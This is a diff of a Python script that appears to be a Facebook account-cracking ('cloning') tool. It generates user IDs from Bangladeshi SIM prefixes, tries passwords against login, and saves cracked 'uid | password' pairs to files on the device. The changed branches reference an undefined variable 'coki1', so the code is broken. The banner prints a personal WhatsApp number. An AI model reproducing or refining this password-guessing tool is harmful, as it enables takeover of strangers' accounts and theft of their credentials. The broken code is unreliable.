@@ -222,11 +222,11 @@ logo = ("""
 \x1b[1;96m.o. 88P o888o o888bood8P'   `Y8bood8P'  o8o        `8
 \x1b[1;96m`Y888P
 \033[38;5;46m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-\033[38;5;46m┃ \x1b[38;5;196m√ADMIN\x1b[38;5;196m   :\x1b[1;96       JIBON SARKAR           \033[38;5;46m┃
+\033[38;5;46m┃ \x1b[38;5;196m√ADMIN\x1b[38;5;196m   :\x1b[1;96      JIBON SARKAR           \033[38;5;46m┃
 \033[38;5;46m┃ \x1b[1;96m√FREE    \x1b[38;5;196m: \033[33;1mTOOL                      \033[38;5;46m┃
 \033[38;5;46m┃ \033[33;1m√NETWORK \x1b[38;5;196m: \x1b[38;5;196m3G 4G                     \033[38;5;46m┃
 \033[38;5;46m┣━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┫
-\033[38;5;46m┃ \033[33;1mGITHUB  \x1b[38;5;196m: \x1b[38;5;208mJIBON-SARKAR    \033[38;5;46m┃\033[33;1m BD:RANDOM \033[38;5;46m┃
+\033[38;5;46m┃ \033[33;1mGITHUB  \x1b[38;5;196m: \x1b[38;5;208mJIBON-SARKAR   \033[38;5;46m┃\033[33;1m BD:RANDOM \033[38;5;46m┃
 \033[38;5;46m┃ \x1b[1;96mWATHSAPP\x1b[38;5;196m: \033[1;97m+8801865544636 \033[38;5;46m┃\033[1;97m\033[1;45mVersion 0.1\033[1;0m\033[1;97m\033[38;5;46m┃
 \033[38;5;46m╚━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━╝\033[1;37m\n""")
 def Main():
@@ -276,6 +276,7 @@ def mathod1():
 		print(' TOTAL ACCOUNT :\033[1;92m '+tl)
 		print(f' \033[1;37mBD SIM CODE   :\033[1;92m {kode}\033[1;37m ')
 		print(' USE [\033[1;32mAIRPLANE\033[1;37m] MODE FOR Ok IDS')
+		print("\x1b[1;96m--------------------------------------------------")
 		# print(' â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
 		for guru in user:
 			uid = kode+koda+kodb+guru
@@ -308,6 +309,7 @@ def mathod2():
 		print(' Cloneing Limit :\033[1;92m '+tl)
 		print(f' \033[1;37mSim Code :\033[1;92m {kode}\033[1;37m ')
 		print(' Use [\033[1;32mAirplane\033[1;37m] Mode For Ok Ids')
+		print("\x1b[1;96m--------------------------------------------------")
 		print(' â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
 		for guru in user:
 			uid = kode+koda+kodb+guru
@@ -366,17 +368,17 @@ def a(uid,pwx,tl):
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                idf = coki[151:166]
+                uid = "1000"+coki1[0:11]
                 print(f'\r\33[1;92m [JIBON-OK] '+uid+' | '+ps+'\33[0;92m')
                 #print(f'\r\033[1;37m [COOKIES] '+coki)
                 open('/sdcard/JIBON-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
-            elif 'checkpoint' in log_cookies:
+            else:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                idf = coki[82:97]
-                print(f"\33[1;91m[JIBON-CP] {uid} | {ps}")
-                open('/sdcard/JIBON-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                uid = "1000"+coki1[0:11]
+                #print(f'\r\33[1;92m [JIBON-CP] '+uid+' | '+ps+'\33[0;92m')
+                open('/sdcard/JIBON-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(uid)
                 break
             else:
@@ -435,18 +437,17 @@ def m2(uid,pwx,tl):
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                idf = coki[65:80]
+                uid = "1000"+coki1[0:11]
                 print(f'\r\33[1;92m [JIBON-OK] '+uid+' | '+ps+'\33[0;92m')
-              #  print(f'\r\33[35;1m [COOKIES] '+coki)
-           #     cek_apk(session,coki)                
-                open('/sdcard/JIBON-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
+                #print(f'\r\033[1;37m [COOKIES] '+coki)
+                open('/sdcard/JIBON-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
-            elif 'checkpoint' in log_cookies:
+            else:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                idf = coki[82:97]
-                #print(f"\33[1;91m[JIBON-CP] {uid} | {ps}")
-                open('/sdcard/JIBON-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                uid = "1000"+coki1[0:11]
+                #print(f'\r\33[1;92m [JIBON-CP] '+uid+' | '+ps+'\33[0;92m')
+                open('/sdcard/JIBON-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(uid)
                 break
             else:
